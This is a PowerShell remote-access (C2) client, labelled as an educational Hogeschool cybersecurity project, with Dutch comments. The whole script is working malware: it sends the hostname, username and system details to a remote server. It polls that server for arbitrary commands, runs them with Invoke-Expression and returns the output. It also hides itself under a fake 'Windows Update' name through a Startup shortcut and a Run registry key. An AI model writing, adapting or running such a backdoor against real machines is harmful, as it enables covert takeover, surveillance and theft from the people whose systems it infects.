
$serverUrl = "https://your-ngrok-url.ngrok-free.app"
$scriptName = "WindowsUpdate.ps1"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$scriptPath = "$env:APPDATA\$scriptName"

function Send-Beacon {
    param($data)
    try {
        $body = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            data = $data
            timestamp = (Get-Date).ToString()
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$serverUrl/beacon" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10
        return $response
    } catch {
        Write-Host "[!] Beacon failed: $($_.Exception.Message)" -ForegroundColor Yellow
        return $null
    }
}

# Functie: Poll voor commands
function Get-Command {
    try {
        $response = Invoke-RestMethod -Uri "$serverUrl/command?id=$env:COMPUTERNAME" -Method GET -UseBasicParsing -TimeoutSec 10
        return $response.command
    } catch {
        return $null
    }
}

# Functie: Execute command
function Invoke-RemoteCommand {
    param($cmd)
    try {
        # Special commands
        if ($cmd -eq "exit" -or $cmd -eq "quit") {
            Send-Beacon -data @{type="info"; message="Client shutting down"}
            exit
        }
        
        if ($cmd -eq "persist") {
            Install-Persistence
            $output = "Persistence reinstalled"
        }
        elseif ($cmd -eq "sysinfo") {
            $output = Get-SystemInfo
        }
        elseif ($cmd -eq "screenshot") {
            $output = "Screenshot functie niet geïmplementeerd (vereist extra modules)"
        }
        else {
            # Execute PowerShell command
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        }
        
        # Stuur output terug
        Send-Beacon -data @{
            type = "output"
            command = $cmd
            result = $output
        }
    } catch {
        Send-Beacon -data @{
            type = "error"
            command = $cmd
            error = $_.Exception.Message
        }
    }
}

# Functie: Systeem informatie
function Get-SystemInfo {
    $info = @"
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
Domain: $env:USERDOMAIN
PowerShell Version: $($PSVersionTable.PSVersion)
IP Addresses: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", ")
"@
    return $info
}

# Functie: Installeer persistence
function Install-Persistence {
    try {
        # Kopieer script naar AppData
        if ($PSCommandPath) {
            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force -ErrorAction SilentlyContinue
        }
        
        # Maak startup shortcut
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $Shortcut.WindowStyle = 7 # Hidden
        $Shortcut.Description = "Windows Update Check"
        $Shortcut.Save()
        
        # Registry persistence (backup methode)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
        
        Write-Host "[+] Persistence installed" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[!] Persistence installation failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Main loop
function Start-C2Client {
    Write-Host "[*] C2 Client starting..." -ForegroundColor Cyan
    Write-Host "[*] Server: $serverUrl" -ForegroundColor Cyan
    
    # Installeer persistence bij eerste run
    if (-not (Test-Path $scriptPath)) {
        Write-Host "[*] Installing persistence..." -ForegroundColor Yellow
        Install-Persistence
    }
    
    # Stuur initial beacon met sysinfo
    $sysInfo = Get-SystemInfo
    $beacon = Send-Beacon -data @{
        type = "init"
        message = "Client connected"
        sysinfo = $sysInfo
    }
    
    if ($beacon) {
        Write-Host "[+] Connected to C2 server" -ForegroundColor Green
    } else {
        Write-Host "[!] Failed to connect to C2 server" -ForegroundColor Red
        Write-Host "[*] Will retry every 30 seconds..." -ForegroundColor Yellow
    }
    
    # Command polling loop
    $failCount = 0
    $maxFails = 10
    
    while ($true) {
        try {
            $cmd = Get-Command
            
            if ($cmd) {
                Write-Host "[+] Received command: $cmd" -ForegroundColor Green
                Invoke-RemoteCommand -cmd $cmd
                $failCount = 0  # Reset fail counter
            }
            
            # Poll interval: 5 seconden
            Start-Sleep -Seconds 5
            
        } catch {
            $failCount++
            Write-Host "[!] Error in main loop: $($_.Exception.Message)" -ForegroundColor Red
            
            # Als te veel fails, wacht langer
            if ($failCount -ge $maxFails) {
                Write-Host "[!] Too many failures, waiting 60 seconds..." -ForegroundColor Red
                Start-Sleep -Seconds 60
                $failCount = 0
            } else {
                Start-Sleep -Seconds 10
            }
        }
    }
}

# Start de client
Write-Host @"

╔═══════════════════════════════════════════╗
║        C2 CLIENT - EDUCATIONAL            ║
║     Cybersecurity Project - Hogeschool    ║
╚═══════════════════════════════════════════╝

"@ -ForegroundColor Cyan

Start-C2Client
